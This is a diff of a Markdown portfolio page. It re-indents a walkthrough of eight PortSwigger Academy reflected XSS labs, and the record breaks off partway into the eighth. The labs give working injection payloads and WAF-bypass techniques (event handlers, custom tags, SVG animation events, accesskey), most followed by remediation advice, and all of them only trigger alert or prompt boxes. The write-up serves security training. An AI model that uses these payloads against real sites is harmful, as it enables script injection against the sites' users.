@@ -63,307 +63,315 @@ Just for demostration, I completed some labs on [PortSwigger Academy](https://po
 <details markdown="1">
   <summary>Click me to expand the labs</summary>  
 
-_**1. Reflected XSS into attribute with angle brackets HTML-encoded**_
-The application contains a reflected XSS vulnerability in the search blog feature, where angle brackets are HTML-encoded. I inject an attribute via XSS that triggers an alert function.
-<details markdown="1">
-  <summary>Click me to expand the process</summary>
+  _**1. Reflected XSS into attribute with angle brackets HTML-encoded**_
+  The application contains a reflected XSS vulnerability in the search blog feature, where angle brackets are HTML-encoded. I inject an attribute via XSS that triggers an alert function.
+  <details markdown="1">
+    <summary>Click me to expand the process</summary>
   
-1. Enter random input (e.g., test123) in the user input (URL query)
-  ~~~
-  URL: https[://]web-security-academy[.]net/?search=test123
-  ~~~
+  1. Enter random input (e.g., test123) in the user input (URL query)
+     ~~~
+     URL: https[://]web-security-academy[.]net/?search=test123
+     ~~~
   
-2. Utilize search function in inspection tab, and search for input (e.g., test123)
-  ~~~
-  Result: <input type="text" placeholder="Search the blog..." name="search" value="test123">
-  ~~~
+  2. Utilize search function in inspection tab, and search for input (e.g., test123)
+     ~~~
+     Result: <input type="text" placeholder="Search the blog..." name="search" value="test123">
+     ~~~
   
-3. After learning that our input is within a double-quoted attribute, we can try to bypass the double-quoted attributes by breaking out of the attribute value with the injection of double quotes or equivalent encodings, and then adding the HTML events that triggers the payload.
-  ~~~
-  URL: https[://]web-security-academy[.]net/?search=test123" onmouseover="alert(test)
-  Result: <input type="text" placeholder="Search the blog..." name="search" value="test123" onmouseover="alert(test)">
-  ~~~
+  3. After learning that our input is within a double-quoted attribute, we can try to bypass the double-quoted attributes by breaking out of the attribute value with the injection of double quotes or equivalent encodings, and then adding the HTML events that triggers the payload.
+     ~~~
+     URL: https[://]web-security-academy[.]net/?search=test123" onmouseover="alert(test)
+     Result: <input type="text" placeholder="Search the blog..." name="search" value="test123" onmouseover="alert(test)">
+     ~~~
 
-  {: .box-note}
-  **Note:** The `value` attribute is closed early by the injected quote, and `onmouseover="alert(1)` is interpreted as a new `onmouseover` attribute on the \<input\> tag.
+     {: .box-note}
+     **Note:** The `value` attribute is closed early by the injected quote, and `onmouseover="alert(1)` is interpreted as a new `onmouseover` attribute on the \<input\> tag.
 
-4. Once I hover the cursor over the search bar, it triggers the alert. I identify the XSS vulnerability.
-</details>
--
+  4. Once I hover the cursor over the search bar, it triggers the alert. I identify the XSS vulnerability.
 
-_**2. Reflected XSS into a JavaScript string with angle brackets HTML encoded**_
-In this instance, the application is vulnerable to reflected XSS in the search query tracking functionality, where angle brackets are encoded. The reflection occurs inside a JavaScript string. I break out of the string and triggers the `prompt()` function, to demonstrate the vulnerability.
-<details markdown="1">
-  <summary>Click me to expand the process</summary>
+  </details>
+  -
+
+  _**2. Reflected XSS into a JavaScript string with angle brackets HTML encoded**_
+  In this instance, the application is vulnerable to reflected XSS in the search query tracking functionality, where angle brackets are encoded. The reflection occurs inside a JavaScript string. I break out of the string and triggers the `prompt()` function, to demonstrate the vulnerability.
+  <details markdown="1">
+    <summary>Click me to expand the process</summary>
   
-1. I enter random input (e.g., test) in the user input (search bar)
+  1. I enter random input (e.g., test) in the user input (search bar)
   
-2. Utilize search function in inspection tab, and search for input (e.g., test). I find that the input is directly past into the function.
-  ```javascript
-    var searchTerms = 'test';
-      document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
-  ```
+  2. Utilize search function in inspection tab, and search for input (e.g., test). I find that the input is directly past into the function.
+     ```javascript
+     var searchTerms = 'test';
+       document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+     ```
   
-3. Now I learn that my input is inside the single quote, I try breaking out the single quote with:
-  ~~~
-  Input: '-prompt("TestXSS")-' # breaks the single quote
-         or \\'-prompt("TestXSS")// # If single quotes are escaped
-  ~~~
+  3. Now I learn that my input is inside the single quote, I try breaking out the single quote with:
+     ~~~
+     Input: '-prompt("TestXSS")-' # breaks the single quote
+           or \\'-prompt("TestXSS")// # If single quotes are escaped
+     ~~~
   
-4. The message pops up after I send the query, which confirms that this instance is vulnerable to XSS. <br> Just to double-check, I pull out the script from the inspection tab.
-  ```javascript
-  var searchTerms = ''-prompt("TestXSS")-'';
-  document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
-  ```
-  
-</details>
--
+  4. The message pops up after I send the query, which confirms that this instance is vulnerable to XSS. <br> Just to double-check, I pull out the script from the inspection tab.
+     ```javascript
+     var searchTerms = ''-prompt("TestXSS")-'';
+     document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+     ```
+  </details>
+  -
 
-_**3. Reflected DOM XSS**_
-In this instance, a script on the page processes reflected data (user input) with `eval()` without any sanitization and ultimately writes it to a dangerous sink.
+  _**3. Reflected DOM XSS**_
+  In this instance, a script on the page processes reflected data (user input) with `eval()` without any sanitization and ultimately writes it to a dangerous sink.
+  <details markdown="1">
+    <summary>Click me to expand the process</summary>
 
-<details markdown="1">
-  <summary>Click me to expand the process</summary>
+  1. First, I find the script used in the web application under the Network tab on the Inspection page.
+     - The `xhr.open` method sends a GET request (with user input retrieved from `path + window.location.search`) and fetches data from the server using `XMLHttpRequest`.
+     - Then it parses the JSON response (`this.responseText`) with `eval()`.
+     - Lastly, it dynamically create and display search results (`displaySearchResults`) in the HTML DOM.
 
-1. First, I find the script used in the web application under the Network tab on the Inspection page.
-   - The `xhr.open` method sends a GET request (with user input retrieved from `path + window.location.search`) and fetches data from the server using `XMLHttpRequest`.
-   - Then it parses the JSON response (`this.responseText`) with `eval()`.
-   - Lastly, it dynamically create and display search results (`displaySearchResults`) in the HTML DOM.
-
-   ```javascript
-   var xhr = new XMLHttpRequest();
-   xhr.onreadystatechange = function() {
-      if (this.readyState == 4 && this.status == 200) {
+     ```javascript
+     var xhr = new XMLHttpRequest();
+     xhr.onreadystatechange = function() {
+          if (this.readyState == 4 && this.status == 200) {
           eval('var searchResultsObj = ' + this.responseText);
           displaySearchResults(searchResultsObj);
-      }
-   };
-   xhr.open("GET", path + window.location.search);
-   xhr.send();
-   ```
+          }
+     };
+     xhr.open("GET", path + window.location.search);
+     xhr.send();
+     ```
    
-2. I send a test request and intercept the response using Burp Proxy.
+  2. I send a test request and intercept the response using Burp Proxy.
 
-   ```json
-   {"results":[],"searchTerm":"test"}
-   ```
+     ```json
+     {"results":[],"searchTerm":"test"}
+     ```
 
-3. Because the script uses `eval()` to process the response, I can insert the `prompt()` function (see JSON Values in the [JSON Syntax](https://www.w3schools.com/js/js_json_syntax.asp))."
-   Now that I know the JSON structure, I create an input to break out of the expected structure in Burp Repeater.
+  3. Because the script uses `eval()` to process the response, I can insert the `prompt()` function (see JSON Values in the [JSON Syntax](https://www.w3schools.com/js/js_json_syntax.asp))."  
+     Now that I know the JSON structure, I create an input to break out of the expected structure in Burp Repeater.
 
-4. In the response to my first payload attempt `test\"-prompt()}//`, the double quote is escaped by the application, so I add an extra backslash (`\`) to bypass it.
-   ~~~
-   1-st_Request: ?search=test"-prompt()}//
-   Response: {"results":[],"searchTerm":"test\"-prompt()}//"}
-   -
-   2-nd_Request: ?search=test\"-prompt()}//
-   Response: {"results":[],"searchTerm":"test\\"-prompt()}//"}
-   ~~~
+  4. In the response to my first payload attempt `test\"-prompt()}//`, the double quote is escaped by the application, so I add an extra backslash (`\`) to bypass it.
+     ~~~
+     1-st_Request: ?search=test"-prompt()}//
+     Response: {"results":[],"searchTerm":"test\"-prompt()}//"}
+     ~~~
+     ~~~
+     2-nd_Request: ?search=test\"-prompt()}//
+     Response: {"results":[],"searchTerm":"test\\"-prompt()}//"}
+     ~~~
 
-   {: .box-note}
-   **Note:** The [Arithmetic Operators](https://www.w3schools.com/programming/prog_operators_arithmetic.php#gsc.tab=0) (`-`) forces `prompt()` to be parsed and executed as part of an expression. And ensuring it is executed immediately, not just ignored.
-   And the `//` comments out whatever is after it.
+     {: .box-note}
+     **Note:** The [Arithmetic Operators](https://www.w3schools.com/programming/prog_operators_arithmetic.php#gsc.tab=0) (`-`) forces `prompt()` to be parsed and executed as part of an expression. And ensuring it is executed immediately, not just ignored.
+     And the `//` comments out whatever is after it.
 
-</details>
--
+  </details>
+  -
 
-_**4. Reflected XSS into HTML context with most tags and attributes blocked**_
-In this instance, the `/?search` parameter is being reflected into the page as HTML without proper contextual encoding or sanitization, and the WAF’s tag/attribute filtering is insufficient, so I bypass the filter and executes `prompt()`.
+  _**4. Reflected XSS into HTML context with most tags and attributes blocked**_
+  In this instance, the `/?search` parameter is being reflected into the page as HTML without proper contextual encoding or sanitization, and the WAF’s tag/attribute filtering is insufficient, so I bypass the filter and executes `prompt()`.
 
-<details markdown="1">
-  <summary>Click me to expand the process</summary>
+  <details markdown="1">
+    <summary>Click me to expand the process</summary>
 
-1. After using general XSS testing payloads, I learn that the WAF is blocking some HTML tags to prevent common XSS.
-   ~~~
-   Payload: <img src="0" onerror="prompt()">
-   Respond: "Tag is not allowed"
-   ~~~
+  1. After using general XSS testing payloads, I learn that the WAF is blocking some HTML tags to prevent common XSS.
+     ~~~
+     Payload: <img src="0" onerror="prompt()">
+     Respond: "Tag is not allowed"
+     ~~~
 
-2. To find out which tag isn't blocked, I used Burp Intruder with all tag options as payload (retrieved from the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)). The result tells me that `<body>` is not blocked by the WAF.
-   ~~~
-   Burp Intruder:
+  2. To find out which tag isn't blocked, I used Burp Intruder with all tag options as payload (retrieved from the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)). The result tells me that `<body>` is not blocked by the WAF.
+     ~~~
+     Burp Intruder:
      GET /?search=<Payload Position> HTTP/2
-   ~~~
+     ~~~
 
-3. After enclosing payloads within the `<body>` tag, I learn that the WAF is also blocking some attributes.
-   ~~~
-   Payload: <body onload="prompt()">
-   Respond: "Attributes is not allowed"
-   ~~~
+  3. After enclosing payloads within the `<body>` tag, I learn that the WAF is also blocking some attributes.
+     ~~~
+     Payload: <body onload="prompt()">
+     Respond: "Attributes is not allowed"
+     ~~~
 
-4. Repeating step 2, but this time I copy the events from the XSS cheat sheet. I got some events that comes back with 200 OK. 
-   ~~~
-   Burp Intruder:
+  4. Repeating step 2, but this time I copy the events from the XSS cheat sheet. I got some events that comes back with 200 OK. 
+     ~~~
+     Burp Intruder:
      GET /?search=<body%20<Payload Position>=prompt()>
-   ~~~
+     ~~~
 
-5. To make the exploitation more realistic, after going through the unfiltered event attributes:
-   - I used an `<iframe>` to embeds this vulnerable webpage (`src="https[://]vulnerable[.]com/`).
-   - The query parameter `/?search` then load the URL-encoded payload `%22%3E%3Cbody+onresize=prompt()%3E`
-   - [this.style.width](https://www.w3schools.com/jsref/prop_style_width.asp) to adjust the iframe’s size, which will trigger the `onresize` event and `prompt()`.
-   ~~~
-   <iframe src="https[://]vulnerable[.]com/?search=%22%3E%3Cbody+onresize=prompt()%3E" onload=this.style.height='88px'></iframe>
-   ~~~
+  5. To make the exploitation more realistic, after going through the unfiltered event attributes:
+     - I used an `<iframe>` to embeds this vulnerable webpage (`src="https[://]vulnerable[.]com/`).
+     - The query parameter `/?search` then load the URL-encoded payload `%22%3E%3Cbody+onresize=prompt()%3E`
+     - [this.style.width](https://www.w3schools.com/jsref/prop_style_width.asp) to adjust the iframe’s size, which will trigger the `onresize` event and `prompt()`.
+     ~~~
+     <iframe src="https[://]vulnerable[.]com/?search=%22%3E%3Cbody+onresize=prompt()%3E" onload=this.style.height='88px'></iframe>
+     ~~~
 
-6. Because I bypass the WAF filter with non-filterd tag and attribution, the function `prompt()` will be executed once someone clicks on the link.
+  6. Because I bypass the WAF filter with non-filterd tag and attribution, the function `prompt()` will be executed once someone clicks on the link.
 
-**Suggestion**: Remediate by [treating user input strictly as data](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#xss-defense-philosophy) (encode/escape for the HTML context or render search terms as text nodes, never raw HTML), apply a server‑side allowlist sanitizer (or a vetted library such as [DOMPurify](https://www.npmjs.com/package/dompurify) when sanitization is required), enforce a strong [Content Security Policy](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html) that disallows inline event handlers/scripts, and [harden WAF normalization/rules](https://docs.oracle.com/en-us/iaas/Content/WAF/Protections/protections_management.htm) to catch decoded event-attribute payloads.
-</details>
--
+  **Suggestion**: Remediate by [treating user input strictly as data](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#xss-defense-philosophy) (encode/escape for the HTML context or render search terms as text nodes, never raw HTML), apply a server‑side allowlist sanitizer (or a vetted library such as [DOMPurify](https://www.npmjs.com/package/dompurify) when sanitization is required), enforce a strong [Content Security Policy](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html) that disallows inline event handlers/scripts, and [harden WAF normalization/rules](https://docs.oracle.com/en-us/iaas/Content/WAF/Protections/protections_management.htm) to catch decoded event-attribute payloads.
 
-_**5. Reflected XSS into HTML context with all tags blocked except custom ones**_
-In this instance, I find that the WAF blocks standard tags but allows custom element names. Because browser will parse custom tags as valid elements (`<cust-foo>`) and allow attributes (`onfocus`), I bypass the WAF and execute a prompt with custom tag, and other components to simulate the exploit in a real‑world scenario.
+  </details>
+  -
 
-<details markdown="1">
-  <summary>Click me to expand the process</summary>
+  _**5. Reflected XSS into HTML context with all tags blocked except custom ones**_
+  In this instance, I find that the WAF blocks standard tags but allows custom element names. Because browser will parse custom tags as valid elements (`<cust-foo>`) and allow attributes (`onfocus`), I bypass the WAF and execute a prompt with custom tag, and other components to simulate the exploit in a real‑world scenario.
 
-1. I started by testing the input form, and the response indicated that the tag was blocked.
-   ~~~
-   Request: GET /?search=<script>test</script>
-   Response: "Tag is not allowed"
-   ~~~
+  <details markdown="1">
+    <summary>Click me to expand the process</summary>
 
-2. Then I tried using a custom tag (`<cust-foo>`); this time, I did not receive any error. This confirms that the WAF does not block [custom tag](https://matthewjamestaylor.com/custom-tags).
-   ~~~
-   Request: GET /?search=<cust-foo>test</cust-foo>
-   Response: HTTP/2 200 OK
-   ~~~
+  1. I started by testing the input form, and the response indicated that the tag was blocked.
+     ~~~
+     Request: GET /?search=<script>test</script>
+     Response: "Tag is not allowed"
+     ~~~
 
-3. The browser treats custom tags (`<cust-foo>`) as valid HTML elements and parses their attributes and event handlers (`onmouseover`), which execute JavaScript when triggered by moving the cursor over a specific spot.
-   ~~~
-   Request: GET /?search=<cust-foo onmouseover='prompt("xss")'>Move your mouse here</cust-foo>
-   Response: A pop-up "xss"
-   ~~~
+  2. Then I tried using a custom tag (`<cust-foo>`); this time, I did not receive any error. This confirms that the WAF does not block [custom tag](https://matthewjamestaylor.com/custom-tags).
+     ~~~
+     Request: GET /?search=<cust-foo>test</cust-foo>
+     Response: HTTP/2 200 OK
+     ~~~
 
-4. To make the exploitation more realistic, I used custom tags with some components to create an .html file. As soon as a user opens it, they woulbe be redirected to the designated page and the prompt was executed: 
-   - `window.location.assign()`: Redirect the user's browser to a new URL while keeping the current page in the session history (Back button available).
-   - `id`: Gives the element a unique identifier in the DOM (e.g., a1).
-   - `tabindex`: Makes the element focusable, which can be used with `onfocus` events.
-   - `onfocus`: The JavaScript will be triggered when the element (`id`) receives focus.
-   - `#a1`: Call out and focus on the element `a1`.
+  3. The browser treats custom tags (`<cust-foo>`) as valid HTML elements and parses their attributes and event handlers (`onmouseover`), which execute JavaScript when triggered by moving the cursor over a specific spot.
+     ~~~
+     Request: GET /?search=<cust-foo onmouseover='prompt("xss")'>Move your mouse here</cust-foo>
+     Response: A pop-up "xss"
+     ~~~
 
-   ```javascript
-    <script>
-    window.location.assign("https[://]vulnerable[.]com/?search=<cust-tag id=a1 tabindex=1 onfocus='prompt("I am focusable")'>#a1")
-    </script>
-   ```
+  4. To make the exploitation more realistic, I used custom tags with some components to create an .html file. As soon as a user opens it, they woulbe be redirected to the designated page and the prompt was executed:
+     - `window.location.assign()`: Redirect the user's browser to a new URL while keeping the current page in the session history (Back button available).
+     - `id`: Gives the element a unique identifier in the DOM (e.g., a1).
+     - `tabindex`: Makes the element focusable, which can be used with `onfocus` events.
+     - `onfocus`: The JavaScript will be triggered when the element (`id`) receives focus.
+     - `#a1`: Call out and focus on the element `a1`.
 
-**Suggestion**: Use a proven HTML sanitizer (e.g. [DOMPurify](https://www.npmjs.com/package/dompurify)) on output that must contain HTML (server-side). Configure [allowlists](https://help.ivanti.com/ht/help/en_US/ISM/2025/admin-user/Content/Configure/SetUpWizard/Configure%20Allowed%20Tags%20and%20Attribute.htm), only permit required tags and attributes, and explicitly exclude all event handler attributes (e.g., on*). Apply the appropriate [encoding](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#output-encoding) based on where the data will be used (body, attribute, JavaScript string, URL, CSS), and do not rely on a single generic encoding for all contexts. Prefer [framework helpers](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#framework-security) and templating engines that provide automatic, correct output escaping rather than hand‑rolling your own escaping logic. Remove unnecessary HTML rendering of user‑supplied content whenever possible. If a field is a search query or otherwise simple text, return it as plain text (properly escaped) instead of rendering it as HTML with tags.
-</details>
--
+     ```javascript
+     <script>
+     window.location.assign("https[://]vulnerable[.]com/?search=<cust-tag id=a1 tabindex=1 onfocus='prompt("I am focusable")'>#a1")
+     </script>
+     ```
 
-_**6. Reflected XSS with some SVG markup allowed**_
-In this instance, I discovered a reflected XSS vector that bypasses the WAF by using certain unfiltered tags and event. By inserting those, I was able to execute JavaScript, demonstrating a reflected XSS bypass through SVG + SMIL animation events.
+  **Suggestion**: Use a proven HTML sanitizer (e.g. [DOMPurify](https://www.npmjs.com/package/dompurify)) on output that must contain HTML (server-side). Configure [allowlists](https://help.ivanti.com/ht/help/en_US/ISM/2025/admin-user/Content/Configure/SetUpWizard/Configure%20Allowed%20Tags%20and%20Attribute.htm), only permit required tags and attributes, and explicitly exclude all event handler attributes (e.g., on*). Apply the appropriate [encoding](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#output-encoding) based on where the data will be used (body, attribute, JavaScript string, URL, CSS), and do not rely on a single generic encoding for all contexts. Prefer [framework helpers](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#framework-security) and templating engines that provide automatic, correct output escaping rather than hand‑rolling your own escaping logic. Remove unnecessary HTML rendering of user‑supplied content whenever possible. If a field is a search query or otherwise simple text, return it as plain text (properly escaped) instead of rendering it as HTML with tags.
+  
+  </details>
+  -
 
-<details markdown="1">
-  <summary>Click me to expand the process</summary>
+  _**6. Reflected XSS with some SVG markup allowed**_
+  In this instance, I discovered a reflected XSS vector that bypasses the WAF by using certain unfiltered tags and event. By inserting those, I was able to execute JavaScript, demonstrating a reflected XSS bypass through SVG + SMIL animation events.
 
-1. I started by testing the input form, and the response indicated that the tag was blocked.
-   ~~~
-   Request: GET /?search=<script>prompt()</script>
-   Response: "Tag is not allowed"
-   ~~~
+  <details markdown="1">
+    <summary>Click me to expand the process</summary>
 
-2.  To find out which tag isn't blocked, I used Burp Intruder with all tag options as payload (retrieved from the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)). The result tells me that `<animatetransform>`, `<image>`, `<svg>`, `<title>` are not blocked by the WAF.
-   ~~~
-   Burp Intruder:
+  1. I started by testing the input form, and the response indicated that the tag was blocked.
+     ~~~
+     Request: GET /?search=<script>prompt()</script>
+     Response: "Tag is not allowed"
+     ~~~
+
+  2.  To find out which tag isn't blocked, I used Burp Intruder with all tag options as payload (retrieved from the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)). The result tells me that `<animatetransform>`, `<image>`, `<svg>`, `<title>` are not blocked by the WAF.
+     ~~~
+     Burp Intruder:
      GET /?search=<Payload Position> HTTP/1.1
-   ~~~
+     ~~~
 
-3. Next, to find out which event is not filtered. I repeated step 2 but copied the events from the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet). I use `<image>` as example since I know it is not filtered, then I received only `onbegin` events that returned 200 OK.
-   ~~~
-   Burp Intruder:
+  4. Next, to find out which event is not filtered. I repeated step 2 but copied the events from the [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet). I use `<image>` as example since I know it is not filtered, then I received only `onbegin` events that returned 200 OK.
+     ~~~
+     Burp Intruder:
      GET /?search=<image+src="x"+<Payload Position>=1> HTTP/1.1
-   ~~~
+     ~~~
 
-4. After some [researches](https://developer.mozilla.org/en-US/docs/Web/API/SVGAnimationElement/beginEvent_event, "SVGAnimationElement: beginEvent event"), I learned that `<svg>` and `<animatetransform>` can be used with `onbegin`. To test it out, I inserted `prompt()`, and the application responded with a pop‑up window containing my text, which proves that I bypassed the WAF's filters and executed a test script.
-   ~~~
-   <svg><animatetransform onbegin='prompt("Is this vulnerable to XSS?")'>
-   ~~~
+  5. After some [researches](https://developer.mozilla.org/en-US/docs/Web/API/SVGAnimationElement/beginEvent_event, "SVGAnimationElement: beginEvent event"), I learned that `<svg>` and `<animatetransform>` can be used with `onbegin`. To test it out, I inserted `prompt()`, and the application responded with a pop‑up window containing my text, which proves that I bypassed the WAF's filters and executed a test script.
+     ~~~
+     <svg><animatetransform onbegin='prompt("Is this vulnerable to XSS?")'>
+     ~~~
    
-**Suggestion**: Treat any HTML or SVG in user input as untrusted. Ensure [server‑side output encoding](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#output-encoding) is applied. If you must allow HTML/SVG, sanitize server‑side with a library that understands and safely handles SVG (e.g., [DOMPurify](https://www.npmjs.com/package/dompurify)). Deploy a strict [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP) that avoids unsafe-inline and blocks inline script execution and data:/javascript: URLs (use script-src 'self' plus nonces/hashes if inline scripts are required).
-</details>
--
+  **Suggestion**: Treat any HTML or SVG in user input as untrusted. Ensure [server‑side output encoding](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#output-encoding) is applied. If you must allow HTML/SVG, sanitize server‑side with a library that understands and safely handles SVG (e.g., [DOMPurify](https://www.npmjs.com/package/dompurify)). Deploy a strict [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP) that avoids unsafe-inline and blocks inline script execution and data:/javascript: URLs (use script-src 'self' plus nonces/hashes if inline scripts are required).
 
-_**7. Reflected XSS in canonical link tag**_
+  </details>
+  -
+
+  _**7. Reflected XSS in canonical link tag**_
 In this instance, I discovered that untrusted input from the URL query string is reflected into canonical link tag in the page source. By injecting [accesskey](https://www.w3schools.com/jsref/prop_html_accesskey.asp, "HTML DOM Element accessKey") attribute,  I was able to prove code execution in the page context after pressing the keystroke triggered JavaScript.
 
-<details markdown="1">
-  <summary>Click me to expand the process</summary>
+  <details markdown="1">
+    <summary>Click me to expand the process</summary>
 
-1. I opened the Inspector and found the canonical link in the source code.
-  ~~~
-  <link rel="canonical" href="https://web-security-academy.net/">
-  ~~~
+  1. I opened the Inspector and found the canonical link in the source code.
+     ~~~
+     <link rel="canonical" href="https://web-security-academy.net/">
+     ~~~
 
-2. I inserted a test string (`?test`) into the URL and saw my input rendered directly in the canonical link.
-  ~~~
-  <link rel="canonical" href="https[://]web-security-academy[.]net/?test">
-  ~~~
+  2. I inserted a test string (`?test`) into the URL and saw my input rendered directly in the canonical link.
+     ~~~
+     <link rel="canonical" href="https[://]web-security-academy[.]net/?test">
+     ~~~
 
-3. I then added an `accesskey` attribute to the `<link>` tag, and when the designated key was pressed it triggered the `onclick` event. The results showed:
-  - Spaces in my input were encoded (`%20`) in the URL, but they were rendered as extra encoded spaces (` %20`) in the source code.
-  - A single quotes were encoded (`%27`) in the URL, but they rendered as double quotes in the source code.
-  ~~~
-  Request: /?test' accesskey='x' onclick='prompt(test)
-  Response: <link rel="canonical" href="https[://]web-security-academy[.]net/?test" %20accesskey="x" %20onclick="prompt(test)">
-  ~~~
+  3. I then added an `accesskey` attribute to the `<link>` tag, and when the designated key was pressed it triggered the `onclick` event. The results showed:
+     - Spaces in my input were encoded (`%20`) in the URL, but they were rendered as extra encoded spaces (` %20`) in the source code.
+     - A single quotes were encoded (`%27`) in the URL, but they rendered as double quotes in the source code.
+     ~~~
+     Request: /?test' accesskey='x' onclick='prompt(test)
+     Response: <link rel="canonical" href="https[://]web-security-academy[.]net/?test" %20accesskey="x" %20onclick="prompt(test)">
+     ~~~
 
-4. To bypass this, I removed the spaces from my input. After pressing Ctrl+Alt+X, a popup displayed my message.
-  ~~~
-  Request: /?test'accesskey='x'onclick='prompt(&quot;XSS&nbsp;vulnerable?&nbsp;YES!&quot;)
-  Response: <link rel="canonical" href="https[://]web-security-academy[.]net/?test" accesskey="x" onclick="prompt(&quot;XSS&nbsp;vulnerable?&nbsp;YES!&quot;)">
-  ~~~
+  4. To bypass this, I removed the spaces from my input. After pressing Ctrl+Alt+X, a popup displayed my message.
+     ~~~
+     Request: /?test'accesskey='x'onclick='prompt(&quot;XSS&nbsp;vulnerable?&nbsp;YES!&quot;)
+     Response: <link rel="canonical" href="https[://]web-security-academy[.]net/?test" accesskey="x" onclick="prompt(&quot;XSS&nbsp;vulnerable?&nbsp;YES!&quot;)">
+     ~~~
 
-**Suggestion**: Don't reflect user input directly into HTML, ensure [server‑side output encoding](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#output-encoding) is applied. [Sanitize & validate input](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html#implementing-input-validation), if input used as a URL, validate against an allow-list of permitted patterns. Use [DOM methods](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#rule-6-populate-the-dom-using-safe-javascript-functions-or-properties) to create and manage elements, attributes, and text nodes safely. Add/strengthen [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP). Lastly, use [HTTP security headers](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html#security-headers).
-</details>
--
+  **Suggestion**: Don't reflect user input directly into HTML, ensure [server‑side output encoding](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#output-encoding) is applied. [Sanitize & validate input](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html#implementing-input-validation), if input used as a URL, validate against an allow-list of permitted patterns. Use [DOM methods](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#rule-6-populate-the-dom-using-safe-javascript-functions-or-properties) to create and manage elements, attributes, and text nodes safely. Add/strengthen [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP). Lastly, use [HTTP security headers](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html#security-headers).
 
-_**8. Reflected XSS into a JavaScript string with single quote and backslash escaped**_
-In this instance, I discover a XSS vulnerability in the search tracking code. The application inserts user input directly into a JavaScript single-quoted string and escapes single quotes with a backslash, but it does not prevent breaking out of the surrounding script context (angle bracket > not escaped). I terminate the `<script>` tag and injecting a new `<script>` block.
+  </details>
+  -
 
-<details markdown="1">
-  <summary>Click me to expand the process</summary>
+  _**8. Reflected XSS into a JavaScript string with single quote and backslash escaped**_
+  In this instance, I discover a XSS vulnerability in the search tracking code. The application inserts user input directly into a JavaScript single-quoted string and escapes single quotes with a backslash, but it does not prevent breaking out of the surrounding script context (angle bracket > not escaped). I terminate the `<script>` tag and injecting a new `<script>` block.
 
-1. I start by testing the input (`test_input`) to see where it is rendered in the source code, then I find my input is in a search function.
+  <details markdown="1">
+    <summary>Click me to expand the process</summary>
 
-   ```javascript
-   <script>
-     var searchTerms = 'test_input';
-     document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
-   </script>
-   ```
+  1. I start by testing the input (`test_input`) to see where it is rendered in the source code, then I find my input is in a search function.
+
+     ```javascript
+     <script>
+       var searchTerms = 'test_input';
+       document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+     </script>
+     ```
    
-2. To test whether I can break out of the single quote (`'`), I try entering a single quote, but it is escaped with a backslash (`'\`).
+  2. To test whether I can break out of the single quote (`'`), I try entering a single quote, but it is escaped with a backslash (`'\`).
 
-   ```javascript
-   <script>
-     var searchTerms = '\'test_input';
-     document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
-   </script>
-   ```
+     ```javascript
+     <script>
+       var searchTerms = '\'test_input';
+       document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+     </script>
+     ```
    
-3. I try to escape the backslash (`\\'`), but it doesn’t work.
+  3. I try to escape the backslash (`\\'`), but it doesn’t work.
 
-   ```javascript
-   <script>
-     var searchTerms = '\\\'test_input';
-     document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
-   </script>
-   ```
+     ```javascript
+     <script>
+       var searchTerms = '\\\'test_input';
+       document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+     </script>
+     ```
    
